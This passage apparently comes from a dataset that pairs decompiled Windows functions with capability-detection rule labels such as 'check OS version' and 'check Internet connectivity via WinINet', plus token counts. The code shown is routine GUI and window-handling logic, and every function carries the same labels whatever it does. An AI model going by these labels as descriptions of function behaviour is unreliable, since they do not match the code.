+ -1) {\n        do {\n            var_20h = iVar1;\n            if (var_1ch == 0) break;\n            iVar1 = (**(*var_8h + 0x2c))();\n            iVar1 = iVar1 / *(var_4h + 0x34);\n            if (-1 < iVar1 + -1) {\n                do {\n                    if (var_1ch == 0) break;\n                    fcn.004181e8(&fcn.0046d7ac::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.0046d7ac::var_40h;\n                    uVar2 = fcn.0042d1b4();\n                    fcn.0042d1b4(uVar2);\n                    fcn.00428674(puVar3);\n                    fcn.004181e8(&fcn.0046d7ac::var_40h, *(var_4h + 0x30));\n                    puVar3 = &fcn.0046d7ac::var_40h;\n                    uVar2 = fcn.0042d1b4();\n                    fcn.0042d1b4(uVar2);\n                    fcn.00428674(puVar3);\n                    fcn.0046cd0c();\n                    var_1ch = var_1ch + -1;\n                    iVar1 = iVar1 + -1;\n                } while (iVar1 != 0);\n            }\n            var_20h = var_20h + -1;\n            iVar1 = var_20h;\n        } while (var_20h != 0);\n    }\n    *in_FS_OFFSET = puVar3;\n    fcn.00404640();\n    fcn.00404640();\n    fcn.0046dddc();\n    return;\n}\n",
        "token_count": 1071
    },
    "0046dc94": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046dc94(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_4h;\n    \n    if (*0x4ab06c == 0) {\n        *0x4ab06c = fcn.0040e2a0();\n        if (0x5ffff < *0x4ab06c) {\n            iVar1 = sub.kernel32.dll_GetModuleHandleA_2();\n            if (iVar1 != 0) {\n                *0x4ab070 = sub.kernel32.dll_GetProcAddress_1();\n            }\n        }\n    }\n    puStack40 = 0x46dcf3;\n    iVar1 = fcn.0042018c(0);\n    uStack44 = 0x46dd8e;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    if (*0x4ab070 == NULL) {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        puStack40 = &stack0xfffffffc;\n        uVar3 = fcn.0046cbd0(iVar1);\n        iVar1 = sub.comctl32.dll_ImageList_Write();\n        if (iVar1 == 0) {\n            fcn.0040dab4();\n            fcn.00404eb4();\n        }\n    }\n    else {\n        if (iVar1 != 0) {\n            iVar1 = iVar1 + 0x14;\n        }\n        uVar3 = 1;\n        puStack40 = &stack0xfffffffc;\n        uVar2 = fcn.0046cbd0(1, iVar1);\n        iVar1 = (**0x4ab070)(uVar2);\n        if (iVar1 != 0) {\n            fcn.0040dab4();\n            fcn.00404eb4();\n        }\n    }\n    *in_FS_OFFSET = uVar3;\n    uStack48 = 0x46dd95;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 481
    },
    "0046dddc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0046dddc(void)\n\n{\n    int32_t in_EAX;\n    \n    if (0 < *(in_EAX + 0x5c)) {\n        *(in_EAX + 0x5c) = *(in_EAX + 0x5c) + -1;\n    }\n    if (*(in_EAX + 0x58) != '\\0') {\n        *(in_EAX + 0x58) = 0;\n        fcn.0040483c();\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "0046e55c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __fastcall fcn.0046e55c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint var_1h;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404964();\n        param_2 = extraout_DL;\n    }\n    fcn.0041f670();\n    uVar1 = fcn.00404610();\n    *(in_EAX + 0x30) = uVar1;\n    iVar2 = fcn.00404610();\n    *(in_EAX + 0x34) = iVar2;\n    *(iVar2 + 0xc) = in_EAX;\n    *(iVar2 + 8) = 0x46e6e0;\n    *(in_EAX + 0x58) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049bc();\n        *in_FS_OFFSET = uStack32;\n    }\n    return in_EAX;\n}\n",
        "token_count": 271
    },
    "0046e7d8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t fcn.0046e7d8(void)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint8_t uVar3;\n    int16_t iVar4;\n    int32_t in_EAX;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uint32_t uStack20;\n    \n    uStack20 = uStack20 & 0xffffff00;\n    cVar2 = fcn.00457b88();\n    if (cVar2 == '\\0') {\n        fcn.00471828();\n        iVar4 = fcn.004538dc();\n        if ((iVar4 != 0) && (iVar6 = *(*(in_EAX + 0x30) + 8),  -1 < iVar6 + -1)) {\n            iVar7 = 0;\n            do {\n                piVar1 = *(*(*(in_EAX + 0x30) + 4) + iVar7 * 4);\n                cVar2 = fcn.004047cc();\n                if (cVar2 != '\\0') {\n                    if (iVar4 == *(piVar1 + 0x21)) {\ncode_r0x0046e85f:\n                        uVar3 = (**(*piVar1 + 0x50))();\n                        uStack20 = uStack20 | uVar3;\n                        break;\n                    }\n                    if (piVar1[0x24] != 0) {\n                        fcn.0046f0a8();\n                        iVar5 = fcn.0046f108();\n                        if (iVar5 != -1) goto code_r0x0046e85f;\n                    }\n                }\n                iVar7 = iVar7 + 1;\n                iVar6 = iVar6 + -1;\n            } while (iVar6 != 0);\n        }\n    }\n    return CONCAT44(uStack20, uStack20) & 0xffffffff000000ff;\n}\n",
        "token_count": 421
    },
    "0046ec0c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046ec0c(uint param_1, char param_2)\n\n{\n    uchar *puVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t *piVar3;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    if (*(in_EAX + 0x1a) != '\\0') {\n        return;\n    }\n    *(in_EAX + 0x1a) = 1;\n    uStack28 = 0x46ed04;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    if (param_2 != *(in_EAX + 0x69)) {\n        iVar4 = *(in_EAX[0x14] + 8);\n        puVar1 = &stack0xfffffffc;\n        if (-1 < iVar4 + -1) {\n            do {\n                puStack24 = puVar1;\n                piVar3 = fcn.004047f0();\n                if (piVar3 != NULL) {\n                    (**(*piVar3 + 0x50))();\n                }\n                iVar4 = iVar4 + -1;\n                puVar1 = puStack24;\n            } while (iVar4 != 0);\n        }\n        *(in_EAX + 0x69) = param_2;\n        if (((0 < in_EAX[0x1b]) && (*(in_EAX + 0x69) != '\\0')) && (iVar4 = fcn.0046e6a4(),  -1 < iVar4 + -1)) {\n            do {\n                piVar3 = fcn.0046e690();\n                if (((piVar3 != in_EAX) && (cVar2 = fcn.004047cc(),  cVar2 != '\\0')) && (piVar3[0x1b] == in_EAX[0x1b]))\n                {\n                    fcn.0046ec0c();\n                }\n                iVar4 = iVar4 + -1;\n            } while (iVar4 != 0);\n        }\n        (**(*in_EAX + 0x30))();\n    }\n    *in_FS_OFFSET = uStack32;\n    *(in_EAX + 0x1a) = 0;\n    return;\n}\n",
        "token_count": 538
    },
    "0046f0a8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0046f0a8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    if (*(in_EAX + 0x90) == 0) {\n        uVar1 = fcn.00404610();\n        *(in_EAX + 0x90) = uVar1;\n    }\n    return *(in_EAX + 0x90);\n}\n",
        "token_count": 89
    },
    "004713b0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004713b0(void)\n\n{\n    uint8_t uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint8_t uVar3;\n    uint8_t uStack51;\n    uint8_t uStack50;\n    char cStack40;\n    \n    sub.user32.dll_GetWindowLongA();\n    iVar2 = sub.user32.dll_IsIconic();\n    uVar3 = 1 - (iVar2 == 0);\n    iVar2 = sub.user32.dll_IsWindowVisible();\n    if ((iVar2 == 0) && ((in_EAX != *(*0x4ab078 + 0x30) || (*(*0x4ab078 + 0x5b) == '\\0')))) {\n        uVar1 = 0;\n    }\n    else {\n        uVar1 = 1;\n    }\n    if ((uVar1 | uVar3) != 0) {\n        cStack40 = in_EAX;\n        sub.user32.dll_ShowWindow();\n    }\n    if (cStack40 == '\\0') {\n        sub.user32.dll_SetWindowLongA();\n    }\n    else {\n        sub.user32.dll_SetWindowLongA();\n    }\n    uStack51 = in_EAX >> 8;\n    uStack50 = in_EAX >> 0x10;\n    if (((uStack51 & uStack50) != 0) || (uVar3 != 0)) {\n        if (uVar3 == 0) {\n            sub.user32.dll_ShowWindow();\n        }\n        else {\n            sub.user32.dll_ShowWindow();\n        }\n    }\n    return;\n}\n",
        "token_count": 350
    },
    "00471470": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00471470(void)\n\n{\n    if (*(*0x4ab078 + 0x30) != 0) {\n        fcn.0047b1c4();\n    }\n    fcn.0047c974();\n    fcn.0041f924();\n    fcn.0041f8c8();\n    return;\n}\n",
        "token_count": 77
    },
    "004715f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004715f4(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    if ((arg_8h != *0x4a48fc) && (arg_8h != *(*0x4ab078 + 0x30))) {\n        iVar1 = sub.user32.dll_IsWindowVisible(arg_8h);\n        if (iVar1 != 0) {\n            iVar1 = sub.user32.dll_IsWindowEnabled(arg_8h);\n            if (iVar1 != 0) {\n                uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xffffffec);\n                if ((uVar2 & 8) == 0) {\n                    if (*0x4a4900 == 0) {\n                        *0x4a4900 = arg_8h;\n                    }\n                }\n                else if (*0x4a4904 == 0) {\n                    *0x4a4904 = arg_8h;\n                }\n            }\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 238
    },
    "00471658": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t fcn.00471658(void)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    \n    *0x4a4900 = 0;\n    *0x4a4904 = 0;\n    *0x4a48fc = in_EAX;\n    uVar1 = sub.kernel32.dll_GetCurrentThreadId_1(fcn.004715f4, 0);\n    sub.user32.dll_EnumThreadWindows(uVar1);\n    if (*0x4a4900 != 0) {\n        return *0x4a4900;\n    }\n    return *0x4a4904;\n}\n",
        "token_count": 138
    },
    "00471924": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00471924(uint param_1, char param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    do {\n        if (param_2 == '\\0') {\n            cVar1 = fcn.004047cc();\n            if (cVar1 != '\\0') {\ncode_r0x0047194a:\n                cVar1 = fcn.004047cc();\n                if (cVar1 != '\\0') {\n                    return in_EAX;\n                }\n                return 0;\n            }\n        }\n        if (*(in_EAX + 0x30) == 0) goto code_r0x0047194a;\n        in_EAX = *(in_EAX + 0x30);\n    } while( true );\n}\n",
        "token_count": 172
    },
    "00471adc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00471adc(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x18) == '\\0') {\n        cVar1 = fcn.00471c9c();\n        if (cVar1 != '\\0') {\n            cVar1 = fcn.0045f648();\n            if (cVar1 == '\\0') {\n                fcn.004721f4();\n            }\n            else {\n                fcn.004721f4();\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 125
    },
    "00471b14": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00471b14(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        cVar1 = *(in_EAX + 0x5b);\n        if ((cVar1 == '\\0') || (cVar1 == '\\x03')) {\n            if ((*(in_EAX + 0x5b) == '\\x03') || (*0x471b80 == (*0x471b7c & *(in_EAX + 0x61)))) {\n                iVar3 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x40) + *(in_EAX + 0x48);\n                iVar2 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar3) {\n                    iVar2 = iVar3;\n                }\n                *(arg_8h + -4) = iVar2;\n            }\n        }\n        else if (cVar1 == '\\x04') {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x48);\n        }\n    }\n    return;\n}\n",
        "token_count": 300
    },
    "00471b84": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00471b84(int32_t arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if (*(in_EAX + 0x57) != '\\0') {\n        if (*(in_EAX + 0x5b) < 2) {\n            if ((*(in_EAX + 0x5b) == '\\x01') || (*0x471bec == (*0x471be8 & *(in_EAX + 0x61)))) {\n                iVar2 = *(*(arg_8h + -8) + 0xc) + *(in_EAX + 0x44) + *(in_EAX + 0x4c);\n                iVar1 = *(arg_8h + -4);\n                if (*(arg_8h + -4) <= iVar2) {\n                    iVar1 = iVar2;\n                }\n                *(arg_8h + -4) = iVar1;\n            }\n        }\n        else if (*(in_EAX + 0x5b) == 2) {\n            *(arg_8h + -0xc) = *(arg_8h + -0xc) + *(in_EAX + 0x4c);\n        }\n    }\n    return;\n}\n",
        "token_count": 281
    },
    "00471bf0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00471bf0(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (*(*(in_EAX + 4) + 0x96) != '\\0') {\n        cVar1 = (**(**(in_EAX + 4) + 0xd8))();\n        if (cVar1 == '\\0') {\n            fcn.0047232c();\n        }\n        else {\n            iVar2 = fcn.00462d98();\n            if (-1 < iVar2 + -1) {\n                do {\n                    if (*(in_EAX + 0x18) == '\\0') {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.00462d5c();\n                        fcn.00471b14(puVar3);\n                    }\n                    else {\n                        puVar3 = &stack0xfffffffc;\n                        fcn.00462d5c();\n                        fcn.00471b84(puVar3);\n                    }\n                    iVar2 = iVar2 + -1;\n                } while (iVar2 != 0);\n            }\n            fcn.0047232c();\n        }\n    }\n    return;\n}\n",
        "token_count": 287
    },
    "00471c9c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00471c9c(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    \n    uVar3 = 0x100000;\n    if (*(in_EAX + 0x18) == '\\x01') {\n        uVar3 = 0x200000;\n    }\n    if (*(in_EAX + 0x1c) != '\\0') {\n        uVar1 = fcn.00466ca8(0xfffffff0);\n        uVar2 = sub.user32.dll_GetWindowLongA(uVar1);\n        if ((uVar2 & uVar3) != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 170
    },
    "00471d08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00471d08(int32_t arg_8h)\n\n{\n    char cVar1;\n    ushort in_DX;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    if (*(arg_8h + -5) == '\\0') {\n        if ((*(arg_8h + -6) != '\\0') && (cVar1 = fcn.00471cd4(arg_8h),  cVar1 == '\\0')) {\n            iVar2 = (***0x4a4d4c)(in_DX);\n            return -(iVar2 - *(arg_8h + -0xc));\n        }\n        if ((*(arg_8h + -6) == '\\0') && (cVar1 = fcn.00471cd4(arg_8h),  cVar1 != '\\0')) {\n            iVar2 = (***0x4a4d4c)(in_DX);\n            iVar2 = iVar2 - *(arg_8h + -0xc);\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 231
    },
    "004721f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004721f4(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    bool bVar3;\n    \n    if ((*(*(in_EAX + 4) + 0x1c) & 2) == 0) {\n        iVar1 = *(in_EAX + 0x14);\n        if ((param_2 <= iVar1) && (iVar1 = param_2,  param_2 < 0)) {\n            iVar1 = 0;\n        }\n        bVar3 = *(in_EAX + 0x18) != '\\0';\n        if (iVar1 != *(in_EAX + 0xc)) {\n            *(in_EAX + 0xc) = iVar1;\n            if (*(in_EAX + 0x18) == '\\0') {\n                fcn.00466854();\n            }\n            else {\n                fcn.00466854();\n            }\n            if ((((*(*(in_EAX + 4) + 0x1c) & 0x10) != 0) && (iVar1 = fcn.00471968(),  iVar1 != 0)) &&\n               (*(iVar1 + 0x298) != 0)) {\n                (**(**(iVar1 + 0x298) + 0xc))();\n            }\n        }\n        uVar2 = fcn.00466ca8(bVar3);\n        iVar1 = (***0x4a5014)(uVar2);\n        if (iVar1 != *(in_EAX + 0xc)) {\n            uVar2 = fcn.00466ca8(bVar3, *(in_EAX + 0xc), 0xffffffff);\n            (***0x4a4cfc)(uVar2);\n        }\n    }\n    else {\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 426
    },
    "00472374": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00472374(int32_t arg_8h)\n\n{\n    char in_AL;\n    uint uVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    uint uVar4;\n    uint uVar5;\n    int32_t arg_14h;\n    \n    piVar3 = arg_8h + -4;\n    arg_14h = -(in_AL != '\\0');\n    uVar4 = *(*(*piVar3 + 0x34) * 4 + 0x4a4948);\n    uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x4a4920);\n    uVar1 = fcn.00466ca8();\n    fcn.00451ac0(uVar1, uVar2, uVar4, arg_14h);\n    if (0 < *(*piVar3 + 0x24)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x24);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x4a4924);\n        uVar1 = fcn.00466ca8();\n        fcn.00451ac0(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x38)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x38);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x4a4928);\n        uVar1 = fcn.00466ca8();\n        fcn.00451ac0(uVar1, uVar2, uVar4, uVar5);\n    }\n    if (0 < *(*piVar3 + 0x30)) {\n        uVar5 = 0;\n        uVar4 = *(*piVar3 + 0x30);\n        uVar2 = *(*(*piVar3 + 0x18) * 0x14 + 0x4a492c);\n        uVar1 = fcn.00466ca8();\n        fcn.00451ac0(uVar1, uVar2, uVar4, uVar5);\n    }\n    uVar5 = 0;\n    uVar2 = fcn.0042767c();\n    uVar4 = *(*(*piVar3 + 0x18) * 0x14 + 0x4a4930);\n    uVar1 = fcn.00466ca8();\n    fcn.00451ac0(uVar1, uVar4, uVar2, uVar5);\n    return;\n}\n",
        "token_count": 605
    },
    "0047247c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.0047247c(uint param_1, uchar param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    int32_t var_12h;\n    uint var_eh;\n    uint var_ah;\n    int32_t var_6h;\n    \n    *(in_EAX + 0x14) = 0;\n    cVar1 = *(in_EAX + 0x18);\n    var_6h._1_1_ = param_2;\n    unique0x100000a4 = in_EAX;\n    if (*(in_EAX + 0x1c) != '\\0') {\n        iVar2 = fcn.00471d84();\n        iVar2 = *(stack0xfffffff8 + 0x10) - iVar2;\n        *(stack0xfffffff8 + 0x14) = iVar2;\n        if (iVar2 < 0) {\n            *(stack0xfffffff8 + 0x14) = 0;\n        }\n    }\n    var_22h = 0x1c;\n    var_1eh = 0x17;\n    var_1ah = 0;\n    if (*(stack0xfffffff8 + 0x14) < 1) {\n        var_16h = 0;\n    }\n    else {\n        var_16h = *(stack0xfffffff8 + 0x10);\n    }\n    var_12h = fcn.00471d84();\n    var_12h = var_12h + 1;\n    var_eh = *(stack0xfffffff8 + 0xc);\n    var_ah = var_eh;\n    fcn.00472374(&stack0xfffffffc);\n    *(stack0xfffffff8 + 0x44) = 0;\n    uVar3 = fcn.00466ca8(cVar1 == '\\x01', &var_22h, 0xffffffff);\n    (***0x4a5138)(uVar3);\n    fcn.004721f4();\n    iVar2 = fcn.00471d84();\n    uVar4 = (iVar2 * 9) / 10;\n    *(stack0xfffffff8 + 10) = uVar4;\n    if (*(stack0xfffffff8 + 0x1f) != '\\0') {\n        *(stack0xfffffff8 + 8) = (uVar4 & 0xffff) / 10;\n    }\n    return;\n}\n",
        "token_count": 598
    },
    "0047265c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.0047265c(void)\n\n{\n    char cVar1;\n    uint arg_8h;\n    \n    fcn.00462fe4();\n    if (*(*0x4a5178 + 0xd) == '\\0') {\n        cVar1 = fcn.0040e280();\n        if (cVar1 == '\\0') {\n            arg_8h = fcn.00466ca8();\n            fcn.00451af4(arg_8h);\n        }\n    }\n    fcn.00472874();\n    return;\n}\n",
        "token_count": 122
    },
    "004726dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004726dc(void)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint *in_FS_OFFSET;\n    uint arg_8h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00404610();\n    arg_8h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd4;\n    iVar4 = fcn.0045e8c0();\n    iVar5 = *(in_EAX + 0x250);\n    cVar2 = fcn.00471c9c();\n    if ((cVar2 == '\\0') || (*(iVar5 + 0x10) <= iVar4)) {\n        bVar1 = false;\n    }\n    else {\n        bVar1 = true;\n    }\n    if (bVar1) {\n        fcn.004721f4();\n    }\n    iVar5 = fcn.00462d98();\n    if (-1 < iVar5 + -1) {\n        do {\n            fcn.00462d5c();\n            fcn.00462d5c();\n            fcn.004194b8();\n            fcn.0045e5d4();\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    iVar5 = *(iVar3 + 8);\n    if (-1 < iVar5 + -1) {\n        do {\n            arg_8h = 0;\n            fcn.00419610();\n            fcn.004601fc(arg_8h);\n            iVar5 = iVar5 + -1;\n        } while (iVar5 != 0);\n    }\n    if (bVar1) {\n        fcn.00471adc();\n    }\n    *in_FS_OFFSET = arg_8h;\n    fcn.00404640();\n    return;\n}\n",
        "token_count": 437
    },
    "004727f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004727f4(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x25c) < 1) {\n        fcn.00471bf0();\n        fcn.00471bf0();\n    }\n    return;\n}\n",
        "token_count": 63
    },
    "00472874": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
